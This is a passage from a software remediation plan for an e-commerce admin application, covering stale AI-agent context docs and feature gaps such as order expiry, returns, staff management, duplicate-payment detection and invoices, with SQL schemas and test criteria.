### ARCH-010 — `docs/ai-context/` is stale and will mislead the implementing agent

**Priority:** P1
**Category:** Architecture
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
docs/ai-context/ARCHITECTURE.md
docs/ai-context/PENDING_TASKS.md
docs/ai-context/PROJECT_OVERVIEW.md
docs/ai-context/AUTH_CONTEXT.md
docs/ai-context/DATABASE_CONTEXT.md
docs/ai-context/IMPLEMENTATION_LOG.md
.agent/skills/project-context-management/SKILL.md
```

**Problem Description:**
The project's persistent memory (`docs/ai-context/`, enforced by `.agent/skills/project-context-management/SKILL.md`) describes an application that no longer exists. Because the skill tells every agent to read these first and treat them as intent, the drift actively causes wrong work.

Verified drifts:

| Document | Stale statement | Reality |
|---|---|---|
| `ARCHITECTURE.md:16` | Diagram node `LegacyStore["Legacy StoreContext (src/data/store.tsx)"]` | Nothing imports it |
| `ARCHITECTURE.md:224` | "Views currently read and write to `useStore()`" | All views take server props and call actions |
| `PENDING_TASKS.md:150-190` | Phase 6E/7 entirely unchecked (18 view migrations) | All 18 views are migrated |
| `PENDING_TASKS.md:186` | "Decommission `src/data/mock.ts`" open | Already unreferenced (ARCH-004) |
| `PROJECT_OVERVIEW.md:69` | Mock data "must remain functional" | Contradicts reality |
| `PROJECT_OVERVIEW.md:31` | ImageKit listed as "**Planned**" | Implemented (`src/lib/imagekit*.ts`) |
| `AUTH_CONTEXT.md` | References uppercase roles in examples | Lowercase canonical (ADR 008); migration lowercases them |
| `DATABASE_CONTEXT.md` | Likely lists indexes/constraints that differ from SQL | See DB-002/003/004 |
| `PENDING_TASKS.md:191` | "Next.js 16 Proxy Warning: middleware is deprecated… `middleware.ts` is fully supported" | `src/proxy.ts` is used; the note is inverted |
| Repo root | `README.md` still describes "Context API with localStorage persistence" | No context store exists |

Note also that this remediation plan lives at `docs/AI context/PRODUCTION_REMEDIATION_PLAN.md` (capital "AI context" per the task), while the canonical directory is `docs/ai-context/`. On case-insensitive filesystems these are the same path; on Linux they are **two directories**. This must be resolved deliberately, not left ambiguous.

**Current Implementation:**
Eight documents, 2,498 lines total, written across earlier phases and not updated after the RSC migration.

**Root Cause:**
The post-execution protocol in `SKILL.md` requires doc updates after every task; the final migration phase was completed without running it. No CI checks documentation truthfulness.

**Real-World Failure Scenario:**
An agent implementing this very plan reads `PROJECT_OVERVIEW.md:69`, concludes that `src/data/store.tsx` must be preserved, and refuses ARCH-004 — leaving the prototype in the bundle and the `col-*` colour bug in place. Another agent reads `PENDING_TASKS.md` and re-implements 18 completed view migrations.

**Required Implementation:**

1. **Resolve the directory question first.** Recommendation: keep the canonical `docs/ai-context/` and place this plan at `docs/ai-context/PRODUCTION_REMEDIATION_PLAN.md` as well (or move it), so there is exactly one context directory and `SKILL.md`'s references stay valid. If the task requires the exact path `docs/AI context/PRODUCTION_REMEDIATION_PLAN.md`, keep that file and add a short pointer file in `docs/ai-context/` — but document the duplication so no agent edits the wrong copy. **Decide once; write it down.**
2. Rewrite the affected sections rather than appending corrections: `ARCHITECTURE.md` (remove legacy store, document the current layering and the two-guard problem this plan removes), `PROJECT_OVERVIEW.md` (ImageKit is implemented; remove the mock-data restriction), `AUTH_CONTEXT.md` (lowercase roles, error-based guard, capability matrix from SEC-013), `DATABASE_CONTEXT.md` (canonical index inventory from DB-016, normalisation rules from DB-001/003).
3. Update `PENDING_TASKS.md`: tick the completed Phase 6E/7 items with a date, and replace the body of "Remaining Implementation Phases" with a pointer to this remediation plan's Phase tracker.
4. Append this plan's Phase 0–6 to `IMPLEMENTATION_LOG.md` as an entry describing what was audited and documented (not what was fixed — nothing has been fixed).
5. Fix `README.md`'s tech-stack paragraph.
6. Add a `## Documentation freshness` note to `SKILL.md`: any agent that completes a phase must update the four domain docs; docs that contradict source code are defects, not intent.
7. Add a lightweight CI check (TEST-006) that fails if `docs/ai-context/*.md` references a path that does not exist (catch `src/data/store.tsx`-style rot).

**Expected Behavior After Fix:**
`docs/ai-context/` describes the current codebase; an agent reading it first will not be misled; the location of this plan is unambiguous.

**Dependencies:**
- **Should run early** (Phase 0–1) because it governs how every later fix is documented.
- **Related** ARCH-004.

**Testing Requirements:**
- Every file path mentioned in the docs exists (scripted check).
- No doc mentions `useStore`, `StoreProvider`, or uppercase roles.
- `PENDING_TASKS.md` reflects reality.
- The plan file exists at exactly one canonical location (or both, with a pointer and a documented reason).

**Acceptance Criteria:**
- [x] Directory ambiguity resolved and documented.
- [x] Four domain docs rewritten.
- [x] `PENDING_TASKS.md` current.
- [x] `README.md` corrected.
- [x] `IMPLEMENTATION_LOG.md` entry added.
- [ ] Path-existence check in CI.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [x] Verified
- [x] Completed

---

## 6.6 E-commerce Operational Gaps

> These are **features**, not defects. They are P2/P3 and must not be implemented during Phase 1–3 work (Safety Rule 14). Each depends on the integrity work above being complete, because building operations on top of inconsistent state would encode the inconsistency.

---

### ECOM-001 — No unpaid-order expiration

**Priority:** P2
**Category:** E-commerce
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/order.service.ts
src/db/schema/orders.ts
supabase/migrations/20261105000000_initial_schema.sql
src/server/services/inventory.service.ts
```

**Problem Description:**
Orders in `awaiting_payment` reserve stock indefinitely. `orders.payment_due_at timestamptz` exists in the schema but is **never written and never read** (`grep -rn "paymentDueAt\|payment_due_at" src/` → only the schema definition). An abandoned order therefore holds its reservation forever, starving real customers of sellable stock.

**Current Implementation:**
`orders.payment_due_at` (`initial_schema.sql`, orders table); no writer, no reader, no scheduled job. `reserveStock` increments `quantity_reserved` at creation and only `cancelOrderStock` releases it — which requires a human to cancel.

**Root Cause:**
A column was provisioned for expiration, but no lifecycle was implemented and no scheduler exists.

**Real-World Failure Scenario:**
During a launch, 40 customers add items and abandon at the payment screen. 40 reservations sit on the top-selling SKU. Available stock reads 0; the product appears sold out for days. Revenue is lost on customers who would have paid immediately.

**Required Implementation:**

1. Write `payment_due_at = now() + interval '48 hours'` on order creation (configurable via `store_settings`, e.g. `orders.paymentWindowHours`, default 48, bounded 1–168).
2. Implement `orderService.expireUnpaidOrders(now)`: select orders where `status = 'awaiting_payment' AND payment_due_at < now()` **with `FOR UPDATE SKIP LOCKED`**, and for each call the existing `updateOrderStatus({ status: 'cancelled', note: 'Payment window expired' })` — which already releases stock (BUG-007 also releases payments/coupons).
3. Process in batches (e.g. 100 per invocation) and log counts.
4. Provide a trigger mechanism **without inventing infrastructure**: expose `POST /api/admin/jobs/expire-orders` protected by a shared secret header (`CRON_SECRET`), or a Vercel Cron entry. The deployment platform is not documented in the repo — **mark the scheduler choice as a prerequisite** and implement the endpoint so any scheduler can call it.
5. Show the deadline in the UI (order detail + payments queue) so staff can chase before expiry.
6. Do not expire `payment_submitted` orders — proof was received; those need human review.

**Expected Behavior After Fix:**
Unpaid orders cancel themselves after the configured window, releasing stock, failing the payment and releasing the coupon, with a history note. Staff see the deadline in advance.

**Dependencies:**
- **Depends on** BUG-007 (cancellation reconciliation), BUG-004 (stock release), DB-015 (no schema change needed for the column).
- **Related** ECOM-011.

**Testing Requirements:**
- Order older than the window → cancelled, stock released, `payment_due_at` respected.
- Order inside the window → untouched.
- `payment_submitted` → untouched.
- 200 eligible orders → processed in batches, none skipped, none double-cancelled (`SKIP LOCKED`).
- Scheduler call with a wrong secret → `401`.

**Acceptance Criteria:**
- [ ] `payment_due_at` written at creation.
- [ ] Expiry service implemented idempotently with row locks.
- [ ] Job endpoint secured by a secret.
- [ ] Deadline visible in the UI.
- [ ] Scheduler prerequisite documented.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ECOM-002 — No returns or refunds workflow

**Priority:** P2
**Category:** E-commerce
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/payment.service.ts
src/server/services/inventory.service.ts
src/server/services/order.service.ts
src/views/OrderDetail.tsx
supabase/migrations/
```

**Problem Description:**
There is a `refundPayment` status flip (BUG-010) and a `return` value in the movement-reason enum, but no returns workflow: no RMA, no reason capture, no restock decision, no partial-item return, no exchange. A customer returning 2 of 5 items cannot be represented.

**Current Implementation:**
`inventory.service.ts` supports a `return` reason in `adjustStock`; nothing else exists. `OrderDetail.tsx` offers a single refund modal with a free-text reason.

**Root Cause:**
The lifecycle was built forward (place → pay → ship → deliver) and the reverse path was left as an ad-hoc refund.

**Real-World Failure Scenario:**
A hospital returns 8 of 12 scrubs due to sizing. Support refunds the full order (the only option), restocks nothing (BUG-010), and the returned goods never re-enter inventory. The books show a full refund; the warehouse holds 8 sellable units that no system knows about.

**Required Implementation:**

1. New table `order_returns` (migration, §8):
   ```sql
   CREATE TABLE order_returns (
     id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
     order_id uuid NOT NULL REFERENCES orders(id) ON DELETE RESTRICT,
     status text NOT NULL DEFAULT 'requested'
       CHECK (status IN ('requested','approved','received','restocked','rejected','completed')),
     reason text NOT NULL,
     requested_by text REFERENCES ba_user(id) ON DELETE SET NULL,
     approved_by text REFERENCES ba_user(id) ON DELETE SET NULL,
     received_at timestamptz,
     refund_amount numeric(12,2) CHECK (refund_amount IS NULL OR refund_amount > 0),
     notes text,
     created_at timestamptz NOT NULL DEFAULT now(),
     updated_at timestamptz NOT NULL DEFAULT now()
   );
   CREATE TABLE order_return_items (
     id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
     return_id uuid NOT NULL REFERENCES order_returns(id) ON DELETE CASCADE,
     order_item_id uuid NOT NULL REFERENCES order_items(id) ON DELETE RESTRICT,
     quantity integer NOT NULL CHECK (quantity > 0),
     restock boolean NOT NULL DEFAULT true,
     UNIQUE (return_id, order_item_id)
   );
   ```
2. Service: `requestReturn`, `approveReturn`, `receiveReturn` (writes `inventory_movements` with reason `return` for restocked lines and an adjustment for damaged lines), `completeReturn` (calls the refund path from BUG-010 with the computed amount).
3. Validation: returned quantity ≤ ordered quantity − already returned; return window (e.g. 14 days from `delivered_at`, configurable).
4. UI: a Returns tab on the order detail with line-level quantity selection and restock toggles. Reuse existing table/dialog components.
5. Refund is issued only at `completed`, never at `requested`.

**Expected Behavior After Fix:**
Partial returns are representable end-to-end: request → approve → receive → restock → refund, with stock and money reconciled.

**Dependencies:**
- **Depends on** BUG-010 (refund amounts), DB-005, DB-012 (`return` reason), BUG-007.
- **Related** ECOM-003, ECOM-006.

**Testing Requirements:**
- Return 2 of 5 → restock +2, refund proportional, order stays `delivered`.
- Return all 5 → order `refunded`, `refund_amount = total`.
- Over-return rejected.
- Return outside the window rejected.
- Damaged (restock=false) → no stock increment, adjustment movement recorded.

**Acceptance Criteria:**
- [ ] Two tables created with FKs and CHECKs.
- [ ] Full service lifecycle implemented.
- [ ] Movement ledger records returns.
- [ ] UI supports partial selection.
- [ ] Refund only on completion.

**Implementation Complexity:** High

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ECOM-003 — No product exchange flow

**Priority:** P3
**Category:** E-commerce
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/order.service.ts
src/server/services/inventory.service.ts
src/views/OrderDetail.tsx
```

**Problem Description:**
Size/colour exchanges are the single most common after-sale event for apparel, and there is no way to represent one. Staff either create a new order (double-counting revenue and consuming a new coupon eligibility) or adjust stock manually (no linkage to the original order).

**Current Implementation:**
Order creation (`createOrder`) and refund (`refundPayment`) exist; nothing in between.

**Root Cause:**
Out of scope during the initial build; the manual workaround was tolerable at low volume.

**Real-World Failure Scenario:**
A doctor orders a Medium scrub set, needs a Large. Staff cancel the order (refund), then create a new one. Both appear in revenue reporting, stock movements look like a sale plus a cancellation rather than an exchange, and the customer may hit a "one per customer" coupon limit on the replacement.

**Required Implementation:**

1. Model an exchange as **return + replacement order** linked by a nullable `order_returns.replacement_order_id uuid REFERENCES orders(id)` (add to ECOM-002's table rather than a new one).
2. Implement `exchangeService.createExchange(originalOrderId, items, returnItems, admin)` that, in one transaction: creates the return, creates a new order in `draft` (no coupon consumption, `metadata.exchangeOf = originalOrderId`), reserves stock for the replacement lines, and links both.
3. Pricing rule: the replacement is priced at the original item's unit price; any difference is recorded as `refund_amount` or an additional payment. Document the rule explicitly.
4. UI: "Exchange" action on a delivered order, reusing the return dialog with a "replacement item" selector.

**Expected Behavior After Fix:**
An exchange produces one linked pair of records, correct stock movements, and no double revenue.

**Dependencies:**
- **Depends on** ECOM-002 (return tables and lifecycle).
- **Related** BUG-007, ECOM-001.

**Testing Requirements:**
- Exchange 1 item for a different size → return row + replacement order linked; stock moves out and in correctly.
- Price difference recorded.
- Revenue reports count the original once.
- Coupon eligibility unchanged.

**Acceptance Criteria:**
- [ ] `replacement_order_id` added.
- [ ] Exchange created atomically.
- [ ] Stock movements correct.
- [ ] Revenue not double-counted.
- [ ] UI action available.

**Implementation Complexity:** High

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ECOM-004 — Customer notes lack author, timestamp and deletion

**Priority:** P2
**Category:** E-commerce
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/views/CustomerDetail.tsx
src/lib/dto.ts
src/server/services/customer.service.ts
```

**Problem Description:**
The feature exists in appearance only: notes render as a list but are a single text blob with fabricated timestamps (BUG-025/DB-011). There is no author, no delete, and no way to see who wrote what.

**Required Implementation:** See BUG-025 (implementation) and DB-011 (schema). ECOM-004 adds the operational surface:

1. Note composer with `Ctrl/Cmd+Enter` submit and optimistic append.
2. Author name + relative timestamp (`2 hours ago`) using existing formatting helpers — do **not** add `date-fns` (ARCH-007 removes it); use `Intl.RelativeTimeFormat`.
3. `super_admin`-only delete with a confirmation dialog and a soft delete (`deleted_at`, `deleted_by`) rather than a hard delete, so the audit trail survives.
4. "Pinned" note flag (`is_pinned`) surfaced first — small, high value for account context (e.g. "always ships to the clinic address").
5. Search within notes for a customer (client-side is fine at this volume; document the limit).

**Expected Behavior After Fix:**
Notes are a real, auditable, deletable-with-history feature.

**Dependencies:**
- **Depends on** BUG-025, DB-011.

**Testing Requirements:**
- Note shows author and timestamp.
- Delete (super_admin) hides it but retains the row.
- `admin` cannot delete.
- Pinned note sorts first.

**Acceptance Criteria:**
- [ ] Composer, author, timestamp.
- [ ] Soft delete with role check.
- [ ] Pin support.
- [ ] No new dependency.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ECOM-005 — No staff management interface

**Priority:** P2
**Category:** E-commerce
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/scripts/create-admin.ts
src/app/                      (no /staff route)
src/lib/auth.ts
```

**Problem Description:**
Administrators can only be created by running a CLI script with database credentials. There is no UI to invite a staff member, change a role, ban/unban, or deactivate an account. Better Auth's admin plugin capabilities (`banned`, `banReason`, `banExpires`) are read by `getCurrentAdmin` but never written by any application code.

**Current Implementation:**
`src/scripts/create-admin.ts` inserts into `ba_user` + `ba_account` directly. `getCurrentAdmin` (`src/server/auth.ts:58-68`) honours `banned` but nothing sets it. No `/staff` route exists (`ls src/app` → 13 route directories, none for staff).

**Root Cause:**
Seeding by script was sufficient for a single-operator deployment; growth requires self-service.

**Real-World Failure Scenario:**
A staff member leaves the company. The only way to revoke access is to run SQL against production (`UPDATE ba_user SET banned = true`). If nobody has credentials, the account stays active indefinitely — a standing insider risk.

**Required Implementation:**

1. New route `/staff` (`super_admin` only, per SEC-013's matrix) listing `ba_user` rows with role, status, last session.
2. Server Actions: `inviteStaffAction` (creates a user with a one-time password or a reset link — do not email passwords), `updateStaffRoleAction`, `banStaffAction` / `unbanStaffAction`, `deactivateStaffAction`.
3. Use Better Auth's admin API where possible (`auth.api.admin.createUser`, `banUser`, `unbanUser`, `setRole`) rather than writing tables directly, so sessions and accounts stay consistent. If a needed API does not exist in `better-auth@1.7.17`, writing `ba_user` is acceptable **only** inside a transaction with an explicit note.
4. Safety rails, enforced server-side:
   - A `super_admin` cannot demote or ban themselves.
   - The last remaining `super_admin` cannot be demoted or banned (`SELECT count(*) FROM ba_user WHERE role='super_admin' AND banned = false`).
   - Every change writes an `audit_logs` row (DB-014).
5. Force session invalidation on ban (delete `ba_session` rows for that user) so the change takes effect immediately rather than at cookie expiry.
6. Update `AUTH_CONTEXT.md` with the new provisioning path and keep the CLI script as a break-glass tool.

**Expected Behavior After Fix:**
A super admin can provision, re-role, and revoke staff from the UI, with immediate effect and an audit trail, without SQL access.

**Dependencies:**
- **Depends on** SEC-004 (role trust), SEC-013 (matrix), DB-014 (audit), ARCH-001.
- **Related** ARCH-009 (CI).

**Testing Requirements:**
- Invite creates a usable account; login works; role honoured.
- Role change takes effect on the next request.
- Ban kills active sessions immediately.
- Self-demotion blocked; last-super-admin blocked.
- `admin` cannot access `/staff`.

**Acceptance Criteria:**
- [ ] Page + actions with `super_admin` enforcement.
- [ ] Better Auth admin API used where available.
- [ ] Three safety rails enforced server-side.
- [ ] Sessions invalidated on ban.
- [ ] Audit rows written.

**Implementation Complexity:** High

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ECOM-006 — No duplicate transaction-reference detection

**Priority:** P2
**Category:** E-commerce
**Severity:** High
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/payment.service.ts
src/server/repositories/payment.repository.ts
src/views/Payments.tsx
supabase/migrations/
```

**Problem Description:**
The same bank/wallet transfer reference can be submitted and approved against multiple orders. Nothing detects it at submission or approval, and the database has no uniqueness guard (DB-013). This is the highest-value fraud vector in a manual-verification payment model.

**Current Implementation:**
`submitPaymentProof` (`payment.service.ts:81-138`) writes `transactionReference` without any lookup. `approvePayment` (`:141-217`) does not check either. `paymentFilterSchema` allows a text search on the reference, so a human *could* detect duplication manually — but nothing prompts them to.

**Root Cause:**
The reference was treated as free-text metadata rather than an external identifier with global scope.

**Real-World Failure Scenario:**
A customer pays PKR 5,300 once, submits the same screenshot for two orders (a common attempt during sales). Both approvals succeed, the second order ships unpaid, and the loss is discovered only at month-end reconciliation — if at all.

**Required Implementation:**

1. Implement the schema half from DB-013 (supporting index + soft flag; hard unique index deferred until the data audit is clean).
2. On `submitPaymentProof`, look up `(payment_method_id, transaction_reference)` excluding the current payment and excluding `rejected` payments. If a match exists, set `metadata.duplicateReference = { paymentId, orderId, status }` and **do not block** the submission (staff must still be able to see and judge it).
3. On `approvePayment`, if the payment carries `metadata.duplicateReference` pointing at a `paid` payment, **block** approval with a `ConflictError` explaining which payment already used that reference. Allow an explicit override only via a `super_admin`-only action that records the override in `metadata` and the audit log (DB-014).
4. Surface the flag prominently in `src/views/Payments.tsx` (a warning badge next to the reference) — use existing badge components, no redesign.
5. Normalise the reference on write: trim, uppercase, strip internal whitespace. Store the normalized form so matches are reliable; keep the original in `metadata.rawReference` if it differs.

**Expected Behavior After Fix:**
A duplicated reference is visible at verification time and cannot be silently approved; an audited override exists for genuine edge cases.

**Dependencies:**
- **Depends on** DB-013 (index + audit), BUG-008 (state model).
- **Related** SEC-014.

**Testing Requirements:**
- Submit the same reference twice → second is flagged.
- Approve the flagged payment → blocked with a clear message.
- Override as `super_admin` → succeeds, audited.
- Different method, same reference → not flagged.
- Normalisation: `" trx 123 "` and `"TRX123"` match.

**Acceptance Criteria:**
- [ ] Duplicate lookup on submit and approve.
- [ ] Approval blocked when the reference is already paid.
- [ ] Audited override path.
- [ ] UI badge.
- [ ] Reference normalised.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ECOM-007 — No invoice or packing-slip generation

**Priority:** P2
**Category:** E-commerce
**Severity:** Medium
**Verification Status:** Confirmed

**Affected Files:**
```
src/views/OrderDetail.tsx
src/app/orders/[id]/
```

**Problem Description:**
There is no printable invoice or packing slip. Fulfilment staff transcribe order details by hand from the screen, and customers receive no document with the order. For a business shipping physical goods with COD, a packing slip is operationally mandatory.

**Current Implementation:**
`src/views/OrderDetail.tsx` renders order data in the app shell with no print stylesheet and no dedicated print route. `grep -rn "print\|invoice\|packing" src/` → no matches.

**Root Cause:**
Document generation was never in scope during the admin build.

**Real-World Failure Scenario:**
The warehouse packs 30 orders a day. Each is read off a screen and hand-written onto a courier label. Item counts and engraving instructions are mis-transcribed; wrong items ship; customers pay COD for the wrong goods.

**Required Implementation:**

1. Add `src/app/orders/[id]/print/page.tsx` — a minimal RSC route with **no app shell** (own layout), rendering two documents selectable by `?doc=invoice|packing-slip`.
2. Invoice contents: store name/address/NTN (from `store_settings`), order number, date, customer billing details, line items with unit price and quantity, engraving description per line, subtotal/engraving/discount/shipping/total, payment method and status.
3. Packing slip contents: order number, ship-to address, courier/tracking, line items **without prices**, engraving instructions **prominently**, and a signature line.
4. Print CSS: `@media print` hiding controls, `A4` page size, black-on-white, no Tailwind colour tokens that degrade in print.
5. Provide a "Print" button on the order detail that opens the route; use `window.print()` on the print page for one-click output.
6. Never expose cost prices or internal notes on the invoice; the packing slip may show internal notes only if a `includeInternalNotes` flag is set and the user is `admin`+.
7. Do not add a PDF library (Safety Rule 8) — browser print-to-PDF is sufficient and keeps the dependency surface small.

**Expected Behavior After Fix:**
Staff print a correct invoice or packing slip from the order in one click; customers receive a proper document.

**Dependencies:**
- **Depends on** BUG-029 (accurate line items/engravings), BUG-005 (stable order numbers).

**Testing Requirements:**
- Invoice totals equal the order totals exactly.
- Packing slip shows engraving text/logo notes for every engraved line.
- Print preview is A4, no clipped columns, no colour-only meaning.
- Unauthenticated access to the print route redirects to login.
- Order with a partial refund displays the refunded amount (BUG-010).

**Acceptance Criteria:**
- [ ] Two documents from one route.
- [ ] No app shell in print.
- [ ] Print CSS correct.
- [ ] One-click from order detail.
- [ ] No new dependency.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ECOM-008 — No orphaned media asset tracking or cleanup

**Priority:** P3
**Category:** E-commerce
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
src/server/services/product.service.ts
src/actions/media.ts
supabase/migrations/
```

**Problem Description:**
Uploads that are never attached to a saved product remain in ImageKit forever. There is no record of which uploads the app issued, so orphans cannot be identified later — `product_images` is the only reference, and by definition an orphan has no row. Storage cost grows monotonically; deletions (SEC-009) can only target known references.

**Current Implementation:**
`uploadServerMediaAction` and the direct-upload path return a file ID to the browser and store nothing. `safeDeleteImageKitFile` is called only from `updateProduct`/`deleteProduct` for known rows.

**Root Cause:**
Media was modelled only from the product's perspective; the upload itself had no record.

**Real-World Failure Scenario:**
An admin experiments with 40 photos for a product, keeps 4, and abandons the draft. 36 files (potentially 100+ MB) sit in the account with no way to distinguish them from legitimate assets.

**Required Implementation:**

1. New table `media_uploads` (migration):
   ```sql
   CREATE TABLE media_uploads (
     id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
     imagekit_file_id text,
     url text NOT NULL,
     folder text NOT NULL,
     uploaded_by text REFERENCES ba_user(id) ON DELETE SET NULL,
     product_id uuid REFERENCES products(id) ON DELETE SET NULL,
     attached_at timestamptz,
     created_at timestamptz NOT NULL DEFAULT now()
   );
   CREATE INDEX idx_media_uploads_orphans ON media_uploads (created_at) WHERE attached_at IS NULL;
   ```
2. Record a row in `confirmMediaUploadAction` (SEC-007) and in `uploadServerMediaAction`.
3. Mark `attached_at` when a `product_images` row is created referencing the file ID (in `createProduct`/`updateProduct`, inside the transaction).
4. Read-only orphan report first: `SELECT * FROM media_uploads WHERE attached_at IS NULL AND created_at < now() - interval '7 days'`.
5. Cleanup is a `super_admin` action with a dry-run mode that prints the list and requires an explicit `confirm: true`; it deletes ImageKit files and marks the rows `deleted_at`. **Never** auto-delete on a schedule without human approval (Safety Rule 10).
6. Do not delete files referenced by any `product_images` row, even if `attached_at` is null (defensive cross-check).

**Expected Behavior After Fix:**
Orphans are enumerable and removable deliberately, with a record of what was removed and by whom.

**Dependencies:**
- **Depends on** SEC-007 (upload confirmation hook), SEC-009 (deletion authority), BUG-021.

**Testing Requirements:**
- Upload → row created with `attached_at = NULL`.
- Attach to a product → `attached_at` set.
- Dry-run lists exactly the orphans older than 7 days.
- Confirm deletes only those and marks the rows.
- A file attached to a product is never listed.

**Acceptance Criteria:**
- [ ] Table + partial index.
- [ ] Rows created on upload, marked on attach.
- [ ] Dry-run then confirm flow.
- [ ] `super_admin` only.
- [ ] Cross-check against `product_images`.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ECOM-009 — No bulk order operations

**Priority:** P3
**Category:** E-commerce
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
src/views/Orders.tsx
src/actions/orders.ts
```

**Problem Description:**
Orders must be advanced one at a time. A day's dispatch of 40 orders requires 80+ individual clicks (processing → shipped), each a separate transaction and round trip. Products supports bulk archive (`Products.tsx:150-160`), orders do not.

**Current Implementation:**
`Orders.tsx` has row-level actions only; `setSelected` exists for products, not orders. `actions/orders.ts` exposes single-order transitions.

**Root Cause:**
Order lifecycle actions were designed around the detail page; the list was read-mostly.

**Real-World Failure Scenario:**
Fulfilment staff spend 20 minutes clicking through 40 orders and inevitably skip one, which then sits in `processing` for days while the customer waits.

**Required Implementation:**

1. Add row checkboxes and a bulk action bar to `Orders.tsx`, reusing the products pattern exactly (same components, same UX).
2. `bulkUpdateOrderStatusAction({ orderIds: uuid[], status, note? })` — `admin` only, max 50 IDs per call (`z.array(uuidSchema).min(1).max(50)`).
3. Process each order in its **own** transaction (never one giant transaction): partial success is expected and must be reported per order. Return `{ succeeded: string[], failed: { id, error }[] }` and render a summary toast plus a details list.
4. Enforce the FSM per order (BUG-006/BUG-012) — a bulk "ship" must skip orders that are not `processing` and report why.
5. Never bulk-approve payments as a side effect. Bulk refunds are explicitly out of scope.
6. Rate-limit the action (SEC-011) so 50 IDs × 3 queries cannot saturate the pool.

**Expected Behavior After Fix:**
Staff dispatch a batch in one action with a truthful per-order result, and no order is silently skipped.

**Dependencies:**
- **Depends on** BUG-006, BUG-012, BUG-033 (selection must work with server pagination).
- **Related** SEC-011.

**Testing Requirements:**
- 10 valid orders → all advanced, one history row each.
- Mixed batch (5 valid, 5 invalid states) → 5 succeed, 5 reported with reasons.
- 51 IDs → validation error.
- `staff` role → `FORBIDDEN`.
- Duplicate IDs in the payload → de-duplicated.

**Acceptance Criteria:**
- [ ] Selection UI matching the products pattern.
- [ ] Per-order transactions with partial-success reporting.
- [ ] FSM enforced per order.
- [ ] Max 50, de-duplicated.
- [ ] No bulk payment actions.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ECOM-010 — No customer communication history

**Priority:** P3
**Category:** E-commerce
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
src/views/CustomerDetail.tsx
src/server/repositories/payment.repository.ts
src/server/repositories/order.repository.ts
```

**Problem Description:**
When a customer calls about an order, staff must open the order, the payments queue, and the customer record separately and mentally merge them. There is no chronological activity feed (orders placed, payments submitted/approved/rejected, notes added, status changes).

**Current Implementation:**
Order detail already assembles `statusHistory`, `payments`, `internalNotes`. The customer detail fetches the customer bundle plus their orders (`customers/[id]/page.tsx:41-56`) but does not merge timelines.

**Root Cause:**
Each domain rendered its own history; cross-domain aggregation was never built.

**Real-World Failure Scenario:**
A customer calls: "I paid last Tuesday and haven't heard anything." The agent opens three screens and still cannot answer confidently, so they promise a callback they will forget.

**Required Implementation:**

1. Add `customerService.getActivityFeed(customerId, limit)` returning a merged, descending list of typed events: `order.placed`, `order.status`, `payment.submitted`, `payment.approved`, `payment.rejected`, `note.added`.
2. Assemble with a single `UNION ALL` query over `orders`, `order_status_history`, `payments`, `customer_notes` (after DB-011), each projecting `(occurred_at, type, title, detail, link)` — one query, not four.
3. Render as a timeline on `CustomerDetail.tsx` using the existing timeline markup from `OrderDetail.tsx`.
4. Cap at 50 events with a "load more" that paginates by `occurred_at` (keyset, not offset).
5. Read-only, `staff`-level.

**Expected Behavior After Fix:**
One screen answers "what has happened with this customer" in chronological order.

**Dependencies:**
- **Depends on** DB-011/BUG-025 (notes table), BUG-029 (accurate authors).

**Testing Requirements:**
- A customer with 3 orders, 2 payments, 1 status change, 1 note → 7 events in the correct order.
- Keyset pagination returns no duplicates or gaps.
- Empty customer → empty state.
- Single query executed (verified by the harness).

**Acceptance Criteria:**
- [ ] One `UNION ALL` query.
- [ ] Six event types mapped.
- [ ] Keyset pagination.
- [ ] Timeline UI reuses existing components.

**Implementation Complexity:** Medium

- [ ] Not Started
- [ ] In Progress
- [ ] Implemented
- [ ] Verified
- [ ] Completed

---

### ECOM-011 — No operational notifications beyond passive badges

**Priority:** P3
**Category:** E-commerce
**Severity:** Low
**Verification Status:** Confirmed

**Affected Files:**
```
src/app/layout.tsx
src/components/layout/topbar.tsx
```

**Problem Description:**
The only alerts are sidebar counts and a dropdown built from the last 3 pending payments/orders (`layout.tsx:107-133`). Nothing pushes a notification; nothing marks items as seen; there is no way to know whether a badge changed since the last visit.

**Current Implementation:**
`notifications` is an array built per render from two `LIMIT 3` queries. It has no read state, no dismissal, and no persistence.

**Root Cause:**
Notifications were implemented as a decorative dropdown rather than a stateful inbox.

**Real-World Failure Scenario:**
A payment proof arrives at 09:00. Staff are on the orders page all morning and never notice the badge tick from 3 to 4 — the dropdown shows the same three items it always does.

**Required Implementation:**

1. Persist read state per user: `notification_reads(user_id, notification_key, read_at)` where `notification_key` is e.g. `payment:<uuid>`.
